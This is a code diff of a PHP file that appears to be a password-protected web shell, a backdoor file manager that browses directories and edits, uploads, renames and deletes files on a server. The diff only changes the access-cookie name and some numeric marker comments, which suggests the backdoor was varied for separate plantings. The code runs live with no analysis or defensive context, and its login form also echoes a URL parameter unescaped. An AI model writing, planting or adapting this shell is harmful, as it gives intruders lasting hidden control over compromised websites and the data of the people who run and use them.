@@ -10,22 +10,22 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 $pass = false;
-if (isset($_COOKIE['pw_name_76482'])) {
-    if(($_COOKIE['pw_name_76482']) == $auth_key) {
+if (isset($_COOKIE['pw_name_93594'])) {
+    if(($_COOKIE['pw_name_93594']) == $auth_key) {
         $pass = true;
     }
 } else {
-    if (isset($_POST['pw_name_76482'])) {
-        if(($_POST['pw_name_76482']) == $auth_key) {
-            setcookie("pw_name_76482", $_POST['pw_name_76482']);
+    if (isset($_POST['pw_name_93594'])) {
+        if(($_POST['pw_name_93594']) == $auth_key) {
+            setcookie("pw_name_93594", $_POST['pw_name_93594']);
             $pass = true;
         }
     }
 }
 if (!$pass) {
-    die("<form action='?p=' method=post ><input type=password name='pw_name_76482' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
+    die("<form action='?p=' method=post ><input type=password name='pw_name_93594' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
 }
-// ---- // 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// ---- // 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 
 echo '
 <!DOCTYPE html>
@@ -41,7 +41,7 @@ echo '
           crossorigin="anonymous" referrerpolicy="no-referrer" />
 </head>
 <body style=" width: 60%; margin: 0 auto;">
-';// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+';// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 
 function formatSizeUnits($bytes)
 {
@@ -60,12 +60,12 @@ function formatSizeUnits($bytes)
     }
     return $bytes;
 }
-// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 function fileExtension($file)
 {
     return substr(strrchr($file, '.'), 1);
 }
-// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 function fileIcon($file)
 {
     $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
@@ -96,20 +96,20 @@ function fileIcon($file)
         return '<i class="fa-solid fa-file"></i> ';
     }
 }
-// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 function encodePath($path)
 {
     $a = array("/", "\\", ".", ":");
     $b = array("ক", "খ", "গ", "ঘ");
     return str_replace($a, $b, $path);
-}// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+}// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 function decodePath($path)
 {
     $a = array("/", "\\", ".", ":");
     $b = array("ক", "খ", "গ", "ঘ");
     return str_replace($b, $a, $path);
 }
-// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 $root_path = __DIR__;
 if (isset($_GET['p'])) {
     if (empty($_GET['p'])) {
@@ -118,7 +118,7 @@ if (isset($_GET['p'])) {
         echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
     } elseif (is_dir(decodePath($_GET['p']))) {
         $p = decodePath($_GET['p']);
-    }// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+    }// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 } elseif (isset($_GET['q'])) {
     if (!is_dir(decodePath($_GET['q']))) {
         echo ("<script>window.location.replace('?p=');</script>");
@@ -129,7 +129,7 @@ if (isset($_GET['p'])) {
     $p = $root_path;
 }
 define("PATH", $p);
-// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 echo ('
 <nav class="navbar navbar-light" style="background-color: #e3f2fd;">
   <div class="navbar-brand">
@@ -144,7 +144,7 @@ foreach ($paths as $id => $dir_part) {
         continue;
     }
     if ($dir_part == '')
-        continue;// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+        continue;// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
     echo "<a href='?p=";
     for ($i = 0; $i <= $id; $i++) {
         echo str_replace(":", "ঘ", $paths[$i]);
@@ -152,7 +152,7 @@ foreach ($paths as $id => $dir_part) {
             echo "ক";
     }
     echo "'>" . $dir_part . "</a>/";
-}// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+}// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 echo ('
 </div>
 <div class="form-inline">
@@ -177,7 +177,7 @@ if (isset($_GET['p'])) {
                 array_push($files, $obj);
             }
         }
-    }// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+    }// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
     echo '
 <table class="table table-hover">
   <thead>
@@ -190,7 +190,7 @@ if (isset($_GET['p'])) {
     </tr>
   </thead>
   <tbody>
-';// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+';// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
     foreach ($folders as $folder) {
         echo "    <tr>
       <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
@@ -203,7 +203,7 @@ if (isset($_GET['p'])) {
       <td>
     </tr>
 ";
-    }// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+    }// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
     foreach ($files as $file) {
         echo "    <tr>
           <td><a style='text-decoration: none;' title='&#32534;&#36753;' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'>" . fileIcon($file) . $file . "</a></td>
@@ -217,7 +217,7 @@ if (isset($_GET['p'])) {
           <td>
     </tr>
 ";
-    }// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+    }// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
     echo "  </tbody>
 </table>";
 } else {
@@ -241,7 +241,7 @@ if (isset($_GET['r'])) {
         <input type="text" name="name" value="' . $_GET['r'] . '">
         <input type="submit" class="btn btn-dark" name="rename">
     </form>';
-        if (isset($_POST['rename'])) {// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+        if (isset($_POST['rename'])) {// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
             $name = PATH . "/" . $_GET['r'];
             if(rename($name, PATH . "/" . $_POST['name'])) {
                 echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
@@ -251,7 +251,7 @@ if (isset($_GET['r'])) {
         }
     }
 }
-// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 if (isset($_GET['e'])) {
     if (!empty($_GET['e']) && isset($_GET['q'])) {
         echo '
@@ -274,7 +274,7 @@ if (isset($_GET['e'])) {
             fclose($open);
         }
     }
-}// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+}// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 if (isset($_POST["upload"])) {
     $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
     if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
@@ -282,7 +282,7 @@ if (isset($_POST["upload"])) {
     } else {
         echo "<p>Sorry, there was an error uploading your file.</p>";
     }
-}// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+}// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 if (isset($_GET['d']) && isset($_GET['q'])) {
     $name = PATH . "/" . $_GET['d'];
     if (is_file($name)) {
@@ -298,7 +298,7 @@ if (isset($_GET['d']) && isset($_GET['q'])) {
             echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
         }
     }
-}// 1720852318119675 1720852318419203 1720852318458223 1720852318552981
+}// 1724682774466556 1724682774821195 1724682774132051 1724682774332551
 echo '
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
